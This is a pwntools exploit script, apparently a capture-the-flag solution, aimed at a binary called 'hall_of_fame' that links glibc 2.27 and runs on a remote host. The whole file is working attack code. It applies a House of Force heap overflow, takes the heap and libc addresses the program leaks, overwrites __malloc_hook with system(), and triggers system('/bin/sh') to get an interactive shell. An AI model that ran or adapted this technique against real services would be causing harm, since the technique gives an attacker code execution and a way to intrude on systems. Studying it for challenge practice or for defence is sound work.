#!/usr/bin/env python3

from pwn import *
# export PYTHONIOENCODING=ISO_8859-1

elf = context.binary = ELF("distrib/hall_of_fame")

libc = ELF("distrib/libc-2.27.so")

gs = '''
continue
'''
def start():
    return remote("34.131.197.225", 50004)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def malloc(size, data):
    io.send("1\n".encode())
    io.sendafter("> ".encode("ISO_8859-1"), f"{size}\n".encode("ISO_8859-1"))
    io.sendafter("> ".encode("ISO_8859-1"), f"{data}\n".encode("ISO_8859-1"))
    io.recvuntil("> ".encode("ISO_8859-1"))

def getHeapAndPut():
    io.send("2\n".encode("ISO_8859-1"))
    io.recvuntil("The position of latest addition is at ".encode("ISO_8859-1"))
    heap = int(io.recvline(), 16)
    io.recvuntil("The position of PUTS is at ".encode("ISO_8859-1"))
    puts = int(io.recvline(), 16)
    io.recvuntil("> ".encode("ISO_8859-1"))
    return heap, puts

io = start()
io.timeout = 1
io.recvuntil("Choose>".encode("ISO_8859-1"))

### Exploit Solution ###

## HOF Primitive -> rewrite size of wilderness
malloc(24, "\x73\x74\x65\x6f"+"\x41"*20+"\xff"*8)

heap, puts = getHeapAndPut()
libc.address = int(puts) - libc.sym.puts
log.success(f"heap @ {hex(heap)}") ## Takes leaked Heap address
log.success(f"libc address @ {hex(libc.address)}") ## Takes libc address


## Calculate distance from malloc hook to heap top chunk
distance = (libc.sym.__malloc_hook - heap + 0x100)
log.info(f"distance: {distance}")

## Malloc to move the heap pointer to the malloc hook pointer location for overwrite on the next malloc
malloc(distance, "/bin/sh\0")

# Sets payload - address of system
payload = p64(libc.sym.system).decode("ISO_8859-1")
#payload = "s" * 8

## Overwrite the pointer on malloc hook which malloc will call when it is called
malloc(24, payload)

## search for /bin/sh string
#cmd = hex(next(libc.search(b"/bin/sh\0")))


## Get the address to the 2nd chunk that we allocate the command at
cmd = heap + 0x20

## Malloc called to execute system("/bin/sh")
malloc(cmd, " ")

###

io.interactive()
